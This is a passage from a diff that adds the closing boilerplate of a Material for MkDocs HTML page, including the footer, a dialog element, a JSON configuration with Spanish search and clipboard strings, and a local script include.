+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.indexes", "navigation.top", "navigation.instant", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
